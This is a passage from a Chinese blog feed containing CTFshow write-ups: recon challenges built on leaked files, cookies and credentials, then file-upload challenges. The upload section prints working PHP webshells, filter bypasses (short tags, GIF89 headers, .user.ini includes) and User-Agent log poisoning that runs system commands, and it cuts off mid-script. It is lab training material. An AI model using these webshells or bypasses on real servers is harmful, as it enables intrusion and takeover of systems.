alt=\"\"></p>\n<p><strong>ctfshow{acd1e1b3-f6e7-4b2b-9ee8-4765b7c81386}</strong></p>\n<h1 id=\"web9\"><a class=\"markdownIt-Anchor\" href=\"#web9\">#</a> WEB9</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/spW00iQuAVWI3hRt.png!thumbnail\" alt=\"\"></p>\n<p>看提示发现是 vim 异常退出</p>\n<p><strong>vim 不正常退出</strong></p>\n<p><strong>第一次产生的交换文件名为 &quot;.file.txt.swp&quot;</strong></p>\n<p><strong>第二次产生的交换文件名为 &quot;.file.txt.swo&quot;</strong></p>\n<p><strong>第三次产生的交换文件则为 &quot;.file.txt.swn&quot;</strong></p>\n<p>访问网页的 swp</p>\n<p>/index.php.swp</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lh4NojeGjn3kobuK.png!thumbnail\" alt=\"\"></p>\n<p>得到文件，打开获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Z4iPrO7vZe966U55.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{b321f4eb-8b4d-4198-9c54-835ec472448d}</strong></p>\n<h1 id=\"web10\"><a class=\"markdownIt-Anchor\" href=\"#web10\">#</a> <strong>WEB10</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Nun5l8VtjHyv8TtC.png!thumbnail\" alt=\"\"></p>\n<p>查看提示应该是有东西存放在 cookie 当中了</p>\n<p>刷新 bp 抓包查看 cookie 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LYsqQOVVNrNIwL0G.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{14750f2e-a526-46c5-8ed8-21411b8e7b48}</strong></p>\n<h1 id=\"web11\"><a class=\"markdownIt-Anchor\" href=\"#web11\">#</a> <strong>WEB11</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9bXRuo7EenULatGv.png!thumbnail\" alt=\"\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1mbGFnLXpmNWY5M2dueGRneWJpeTBlMjBieTVwNnozZHBpZ3MxOWhteWsuY3Rmc2hvdy5jb20=\">题目提示中得到关键信息 flag.ctfshow.com</span></p>\n<p>用 DNS 检测检测它</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aWppYW4uYWxpeXVuLmNvbS8=\">https://zijian.aliyun.com/</span></p>\n<p>可能这里出现了点问题，题目中直接给了 flag</p>\n<p><strong>flag{just_seesee}</strong></p>\n<h1 id=\"web12\"><a class=\"markdownIt-Anchor\" href=\"#web12\">#</a> <strong>WEB12</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/P6QpqRDayVvomF26.png!thumbnail\" alt=\"\"></p>\n<p>按题目提示应该是要我们在网站上去寻找管理员的密码，进入环境看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cyd5U0WFy29zHZkK.png!thumbnail\" alt=\"\"></p>\n<p>先看看常规后台登陆路径：/admin</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cj9yMDwRXsatzcgT.png!thumbnail\" alt=\"\"></p>\n<p>果然有个弹窗让我们输入用户名密码</p>\n<p>用户名猜测应该是 admin，在网站中寻找一些敏感信息作为密码试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vo3ds9A6H3DPZO0y.png!thumbnail\" alt=\"\"></p>\n<p>在网站最下方发现了一个 number，作为密码试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LX47DeGHVQ5rfSWF.png!thumbnail\" alt=\"\"></p>\n<p>登陆成功，获得 flag</p>\n<p><strong>ctfshow{f01dd6dd-4cb7-40d9-9021-7b4ff62387e4}</strong></p>\n<h1 id=\"web13\"><a class=\"markdownIt-Anchor\" href=\"#web13\">#</a> <strong>WEB13</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3DrAkkhgTMsvIN4y.png!thumbnail\" alt=\"\"></p>\n<p>查看提示，继续寻找敏感信息，并且应该存放在一个文档当中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/eZDIx3XCzKYX4xQl.png!thumbnail\" alt=\"\"></p>\n<p>找到了一个 document，点击看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VLpzC38GTidAc9ay.png!thumbnail\" alt=\"\"></p>\n<p>发现文档最下方记录了登录地址、用户名和密码，进行登录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/GJSVLc1hyitRiZeg.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fq9A2vRZqBe81lxq.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{f8674c5d-676a-4d4b-a3df-c4c7f5694db5}</strong></p>\n<h1 id=\"web14\"><a class=\"markdownIt-Anchor\" href=\"#web14\">#</a> <strong>WEB14</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ke9WoRZHI65RNLDh.png!thumbnail\" alt=\"\"></p>\n<p>本题的原理引用其他大佬的博客中的解释</p>\n<p>** 原理：**Editor 编辑器文件空间<br>\n没有找到默认配置文件的目录，就会遍历所有目录.</p>\n<p>先去 editor 看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EDvTnbxl3Y8BWK9L.png!thumbnail\" alt=\"\"></p>\n<p>发现了编辑器，editor 下会有很多目录，使用 view-source 查看源码</p>\n<p>JS 用法：</p>\n<p><strong>window.location=“view-source:” + window.location</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YTiYhtQNMcLlRUox.png!thumbnail\" alt=\"\"></p>\n<p>可以看到泄露了目录</p>\n<p>利用 editor 文件空间功能的漏洞遍历目录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lMNIIBSjl6emaBB5.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7AsjmphKoPRAWiGH.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KOLeuibAb9qwgxSb.png!thumbnail\" alt=\"\"></p>\n<p>这里就能够看到所有的目录了</p>\n<p>既然可以遍历，接下来就是寻找 flag 了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vddnuGLpqNE0WKk3.png!thumbnail\" alt=\"\"></p>\n<p>在 /var/www/html/nothinghere 目录下找到了 fl000g.txt</p>\n<p>在浏览器中访问 /nothinghere/fl000g.txt 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/E2niyYU0Y9qvlpMK.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{c04b6d86-a82a-4b90-8cce-8b15a29585d6}</strong></p>\n<h1 id=\"web15\"><a class=\"markdownIt-Anchor\" href=\"#web15\">#</a> <strong>WEB15</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pOoQO0XJu1e5oQcf.png!thumbnail\" alt=\"\"></p>\n<p>查看提示，应该是邮箱泄露，进入环境</p>\n<p>既然是邮箱泄露，那么应该是作为密码登录后台系统，这时候就要寻找到登录口，先看看常规的路径：/admin</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/J7j65UdTeZRSytz1.png!thumbnail\" alt=\"\"></p>\n<p>发现找到了登录口，回去找找邮箱<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZYWJh4CmdrVQCnmi.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>在网站的最下方找到了邮箱</p>\n<p>用户名：admin 密码：<span class=\"exturl\" data-url=\"bWFpbHRvOjExNTY2MzE5NjFAcXEuY29t\">1156631961@qq.com</span></p>\n<p>进行登录，发现不对，看到还有一个忘记密码选项，点进去看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OIehyn8InrILPXOP.png!thumbnail\" alt=\"\"></p>\n<p>看到只需要知道地点就能重置密码，既然有了邮箱，得到了 qq 号，那么就直接去寻找 qq 号的所在地，显示所在地应该是西安</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0qrzzOM6p8hS3eik.png!thumbnail\" alt=\"\"></p>\n<p>可以看到密码被重置为 admin7789</p>\n<p>重新登录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kUtfUrNqSKzmK795.png!thumbnail\" alt=\"\"></p>\n<p>成功获得 flag</p>\n<p><strong>ctfshow{b67a7b76-60ea-425d-8df8-ead1c8ce836d}</strong></p>\n<h1 id=\"web16\"><a class=\"markdownIt-Anchor\" href=\"#web16\">#</a> <strong>WEB16</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/r8tDxhGymTfXZI6a.png!thumbnail\" alt=\"\"></p>\n<p>看提示应该是没有及时删除测试探针</p>\n<p><strong>知识点：*</strong>* 雅黑 PHP 探针是一个非常经典的 PHP 探针，可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息，1 秒钟刷新一次，以及包括服务器 IP 地址，Web 服务器环境监测，php 等信息。**</p>\n<p>默认雅黑探针解压名为 tz.php，访问 /tz.php</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vlDDUCi1VaS1eiot.png!thumbnail\" alt=\"\"></p>\n<p>点击进入 phpinfo</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cjiYWFWAneI0oQBY.png!thumbnail\" alt=\"\"></p>\n<p>查找得到 flag</p>\n<p><strong>ctfshow{e72225bb-5ecb-45eb-8f7a-c89703073a78}</strong></p>\n<h1 id=\"web17\"><a class=\"markdownIt-Anchor\" href=\"#web17\">#</a> WEB17</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/k2whPsMbVDzFM0II.png!thumbnail\" alt=\"\"></p>\n<p>查看提示，应该是要找到备份的 sql 文件</p>\n<p><strong>知识点：</strong></p>\n<p><strong>备份的 sql 文件会泄露敏感信息</strong></p>\n<p><strong>默认 backup.sql</strong></p>\n<p>访问 /backup.sql，下载 backup.sql 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UB7MKR5SG30IYte6.png!thumbnail\" alt=\"\"></p>\n<p>打开文件得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1WVmsXKjwfhT0WEZ.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{94901a52-9765-4ef5-9842-d187ac5680dc}</strong></p>\n<h1 id=\"web18\"><a class=\"markdownIt-Anchor\" href=\"#web18\">#</a> WEB18</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cBCIwQinSN29KgmL.png!thumbnail\" alt=\"\"></p>\n<p>先查看下游戏的 js 代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/n0PyOu0kWJfDxrOx.png!thumbnail\" alt=\"\"></p>\n<p>进入路径看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XKHNmpH7qTvD3FF6.png!thumbnail\" alt=\"\"></p>\n<p>发现当 score&gt;100 的时候会有一串 unicode 编码，给它解码看看</p>\n<p>得到：你赢了，去幺幺零点皮爱吃皮看看</p>\n<p>翻译过来就是去 110.php 看看，访问下 / 110.php</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6lbJcI0RS8Rg2GND.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{4910e45a-5a12-4abe-871e-4f4f1556a4d8}</strong></p>\n<h1 id=\"web19\"><a class=\"markdownIt-Anchor\" href=\"#web19\">#</a> <strong>WEB19</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yPx2WfU8X1u2Toap.png!thumbnail\" alt=\"\"></p>\n<p>提示我们在前端寻找密钥，打开环境看看 f12</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RJybRoHuAURvHydL.png!thumbnail\" alt=\"\"></p>\n<p>发现有用户名和密码，但是可以知道直接输入是肯定不对的，本题校验是前端密码明文加密之后发向后端的进行校验，而这一串正是加密过后的密文，因此需要用到 bp 抓包发包</p>\n<p><strong>密文：a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/CA6TqSEHGeKGUjYs.png!thumbnail\" alt=\"\"></p>\n<p>同样 send to repeater 发包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Lh9M1rDio1JPW2xU.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{c08528dc-251a-4d3b-9022-2a58df06ca66}</strong></p>\n<h1 id=\"web20\"><a class=\"markdownIt-Anchor\" href=\"#web20\">#</a> <strong>WEB20</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4fkQtBf5hBcupYCB.png!thumbnail\" alt=\"\"></p>\n<p>看提示应该是一个 mdb 文件的泄露</p>\n<p>进入 /db/db.mdb 路径下载文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rTIlgzTxGvFAVjSw.png!thumbnail\" alt=\"\"></p>\n<p>这里我是把下载下来的文件拖入了 winhex 进行查看，搜索 ctfshow 或者 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RNF8UTOXxIzFQUfw.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{ctfshow_old_database}</strong></p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/",
            "url": "https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/",
            "title": "CTFshow文件上传151-170",
            "date_published": "2024-04-16T05:58:18.978Z",
            "content_html": "<h1 id=\"web151\"><a class=\"markdownIt-Anchor\" href=\"#web151\">#</a> WEB151</h1>\n<p>虽然在上传点上传 php 发现不支持 php 的上传，但一句话的 png，发现可以被上传</p>\n<p><strong> <code>&lt;?php @eval($_POST['flag']);?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3Bugw3GuUHXmVH9V.png!thumbnail\" alt=\"\"></p>\n<p>试试 bp 抓包改后缀能不能上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UYnMmUGv5vMeyXto.png!thumbnail\" alt=\"\"></p>\n<p>发现成功上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/a3fNk6qxLoWb2y3z.png!thumbnail\" alt=\"\"></p>\n<p>用蚁剑进行连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iMCi9PqahkJMDljV.png!thumbnail\" alt=\"\"></p>\n<p>成功连接，找到 /var/www/html/flag.php</p>\n<p>里面便是 flag</p>\n<p><strong>ctfshow{e9ec3beb-bb71-481d-bf0b-b1a4ae935379}</strong></p>\n<hr>\n<h1 id=\"web152\"><a class=\"markdownIt-Anchor\" href=\"#web152\">#</a> <strong>WEB152</strong></h1>\n<p>同样先试试 bp 抓包修改能不能传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BHYgJ0RFMftqU7l0.png!thumbnail\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LpKUy6bXRjvK1na2.png!thumbnail\" alt=\"\"></p>\n<p>蚁剑连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/GS1t4idcGUNI0rcH.png!thumbnail\" alt=\"\"></p>\n<p>/var/www/html/flag.php 目录下找到 flag</p>\n<p><strong>ctfshow{c23425b4-aa5d-42bf-8702-7d12b146b090}</strong></p>\n<hr>\n<h1 id=\"web153\"><a class=\"markdownIt-Anchor\" href=\"#web153\">#</a> <strong>WEB153</strong></h1>\n<p>同样的方法再试一遍</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KYBgxM3ysZ9sbE5z.png!thumbnail\" alt=\"\"></p>\n<p>发现上传不了，就传 png 后缀的一句话木马试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NtDvS8jV3zM71WfZ.png!thumbnail\" alt=\"\"></p>\n<p>发现还是对内容没有过滤，只是把后缀过滤了，既然可以上传后缀为 png 的一句话木马，那就上传一个配置文件即 user.ini，把 png 后缀解析了就好</p>\n<p><strong>auto_prepend_file=flag.png</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KbCUTFo1aKzzGk1F.png!thumbnail\" alt=\"\"></p>\n<p>bp 抓包修改文件名和内容，成功上传 user.ini</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/c48njRqdOqems0jp.png!thumbnail\" alt=\"\"></p>\n<p>查看是否被成功解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UqHc7li5pALRmm4j.png!thumbnail\" alt=\"\"></p>\n<p>成功解析，蚁剑进行连接获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/edGWkwq6G9fk3Ulv.png!thumbnail\" alt=\"\"></p>\n<p>同样的目录 /var/www/html/flag.php，得到 flag</p>\n<p><strong>ctfshow{32328274-3d36-4087-b5cb-351a30fef463}</strong></p>\n<hr>\n<h1 id=\"web154\"><a class=\"markdownIt-Anchor\" href=\"#web154\">#</a> <strong>WEB154</strong></h1>\n<p>首先上传 png 后缀的一句话木马</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JqQjYCWWL4oEyN5g.png!thumbnail\" alt=\"\"></p>\n<p>发现应该是对内容进行了过滤</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZC0OqsIptiIAWrPh.png!thumbnail\" alt=\"\"></p>\n<p>发现短标签成功上传</p>\n<p><strong>短标签一句话木马： <code>&lt;?= @eval($_POST['a']);?&gt;</code> </strong></p>\n<p>直接 bp 抓包直接改后缀发现不行，同样上传.user.ini 解析 png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/u3DP6cZy1Uv1Xcok.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Vx5Bxm7EeIn7eAUU.png!thumbnail\" alt=\"\"></p>\n<p>同样用 phpinfo (); 查看是否解析成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Mb0UoULZZE4ZuDF.png!thumbnail\" alt=\"\"></p>\n<p>解析成功，直接使用蚁剑获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/koKiTZjAcWzglRXg.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{054f3929-69ca-4df0-9d8e-a90e1841da3f}</strong></p>\n<p>同样也可以使用 hackbar 获取 flag</p>\n<p><strong>hackbar post 传值：a=system (“cat …/f*”);phpinfo ();</strong></p>\n<hr>\n<h1 id=\"web155\"><a class=\"markdownIt-Anchor\" href=\"#web155\">#</a> WEB155</h1>\n<p>同样上传短标签一句话木马</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pkvzfrnU4sWocblx.png!thumbnail\" alt=\"\"></p>\n<p>发现也同样可以被上传，于是上传配置文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LA5ilCdgceJXnawa.png!thumbnail\" alt=\"\"></p>\n<p>成功上传，查看是否被解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/S0mfwAZUlEEtU4uF.png!thumbnail\" alt=\"\"></p>\n<p>成功，蚁剑连接获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/31Ud1bt2krH1DvgG.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{4879de09-af52-4822-818b-ef6c0ce41af1}</strong></p>\n<hr>\n<h1 id=\"web156\"><a class=\"markdownIt-Anchor\" href=\"#web156\">#</a> <strong>WEB156</strong></h1>\n<p>再试试 png 后缀的短标签是不是能传上去</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2tye0wpOhrbuneab.png!thumbnail\" alt=\"\"></p>\n<p>发现对短标签内容做了过滤，过滤了 []，那就使用花括号绕过</p>\n<p><strong>短标签一句话木马： <code>&lt;?= @eval($_POST&#123;'a'&#125;);?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4tZ6lGoKwSrKneKm.png!thumbnail\" alt=\"\"></p>\n<p>成功上传，上传配置文件解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/knzlhPWKvobiWpz6.png!thumbnail\" alt=\"\"></p>\n<p>上传成功，查看是否被解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Dsnpc6N1Uhs7Zp9Q.png!thumbnail\" alt=\"\"></p>\n<p>同样成功，蚁剑连接获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kpMZi11HyQtmIwTJ.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{e251aa37-7214-42c6-a673-68495af8f905}</strong></p>\n<hr>\n<h1 id=\"web157\"><a class=\"markdownIt-Anchor\" href=\"#web157\">#</a> <strong>WEB157</strong></h1>\n<p>本题过滤了 {} 和分号，因此用一句话就没有那么方便了，用反引号来执行命令获取 flag</p>\n<p><strong>语句： <code>&lt;?=`tac ../f*`?&gt;</code> </strong></p>\n<p>（由于分号被过滤了，因此使用 <code>&lt;? ?&gt;</code>  来代替）</p>\n<p>同样上传 user.ini</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/76NmKxlx5PSrHJUN.png!thumbnail\" alt=\"\"></p>\n<p>成功上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zNN2h4F7eD3XudC7.png!thumbnail\" alt=\"\"></p>\n<p>上传 png 后缀的命令获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/y56QaBkDZfyF603M.png!thumbnail\" alt=\"\"></p>\n<p>访问路径：/upload/index.php 或 /upload/ 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TeSI9ieWcsP1FF5W.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{2d65ff79-1553-470c-a0bd-1a665246e8f7}</strong></p>\n<hr>\n<h1 id=\"web158\"><a class=\"markdownIt-Anchor\" href=\"#web158\">#</a> WEB158</h1>\n<p>WEB156 的同样通杀</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kgNfR6I1Yf40LqCK.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{bf28384e-6da5-43e3-87f8-038071257cdc}</strong></p>\n<hr>\n<h1 id=\"web159\"><a class=\"markdownIt-Anchor\" href=\"#web159\">#</a> <strong>WEB159</strong></h1>\n<p>同 WEB156</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0uvclFFEkCnEWOGX.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{bf28384e-6da5-43e3-87f8-038071257cdc}</strong></p>\n<hr>\n<h1 id=\"web160\"><a class=\"markdownIt-Anchor\" href=\"#web160\">#</a> <strong>WEB160</strong></h1>\n<p>考的知识点是一个双重包含具体的流程为：</p>\n<ol>\n<li>\n<p>用 png 包含文件上传日志的目录<br>\n<strong> <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code> </strong></p>\n</li>\n<li>\n<p>.user.ini 包含 png 文件（相当于把 png 所包含的日志文件中的所有东西解析了）<br>\n<strong>auto_append_file=/var/www/html/upload/1.png</strong></p>\n</li>\n<li>\n<p>刷新抓包修改 UA 头，把构造的命令放入 UA 投中，直接传入日志文件，有上面的两步，因此就能够被解析执行命令，从而 cat<br>\nflag<br>\n<strong> <code>&lt;?php system('tac ../fl*');?&gt;</code> </strong></p>\n</li>\n</ol>\n<p>直接先传入 png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2gaK4KHbLat8g6TZ.png!thumbnail\" alt=\"\"></p>\n<p>传入.user.ini</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mcVCRaPI9YlGiWHx.png!thumbnail\" alt=\"\"></p>\n<p>都上传成功之后修改 UA 头，将命令传入日志中使它被解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/x7Mv1nKz7pAY5dBT.png!thumbnail\" alt=\"\"></p>\n<p>forward 之后去 /upload/ 目录查看是否被解析成功并获取了 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/K3C710nGh7NNHhx5.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{35f1ef2f-2a11-4343-9a14-568a5b5365d2}</strong></p>\n<hr>\n<h1 id=\"web161\"><a class=\"markdownIt-Anchor\" href=\"#web161\">#</a> <strong>WEB161</strong></h1>\n<p>同上题的方法，依旧是双重包含，一起来看看</p>\n<p>同样上传 1.png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ufetbf9pr8Ox0zue.png!thumbnail\" alt=\"\"></p>\n<p>发现文件类型不合规，但是没有对后缀进行过滤，应该是对文件的内容进行了过滤</p>\n<p>这里是校验了一个文件头，因此只需要在文件中加入 GIF89 的 gif 文件头就能实现绕过</p>\n<p>1.png：</p>\n<p><strong>GIF89</strong></p>\n<p><strong> <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code> </strong></p>\n<p>.user.ini：</p>\n<p><strong>GIF89</strong></p>\n<p><strong>auto_append_file=/var/www/html/upload/1.png</strong></p>\n<p>按照上提的步骤再传一遍</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pARcQrX1Li1sRJP8.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9I5oBtewq6w0u7Xp.png!thumbnail\" alt=\"\"></p>\n<p>都成功上传，修改 UA 头，将命令传入 log 中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3Z02b1V4j7AJyQYr.png!thumbnail\" alt=\"\"></p>\n<p>访问 /upload/</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1Mjkj3Z2155KZnjO.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{9c39aa52-c72a-4b62-a2cb-4dce29409f07}</strong></p>\n<hr>\n<h1 id=\"web162\"><a class=\"markdownIt-Anchor\" href=\"#web162\">#</a> <strong>WEB162</strong></h1>\n<p>本题考的知识点是一个 session 的文件包含，具体思路如下：</p>\n<ol>\n<li>构造.user.ini 解析 png<br>\n<strong> 语句：</strong></li>\n</ol>\n<p><strong>GIF89</strong></p>\n<p><strong>auto_append_file=&quot;png&quot;</strong></p>\n<ol>\n<li>构造 png，用 png 包含 session 文件<br>\n<strong>语句：</strong></li>\n</ol>\n<p><strong>GIF89</strong></p>\n<p><strong> <code>&lt;?=include&quot;/tmp/sess_nnnpc&quot;?&gt;</code> </strong></p>\n<ol>\n<li>使用条件竞争脚本，将构造的 session 不断发送并且不断访问，其中在 session 中写入恶意代码，由于之前 png 的包含和.user.ini 的解析，就能进行命令执行 cat<br>\nflag</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 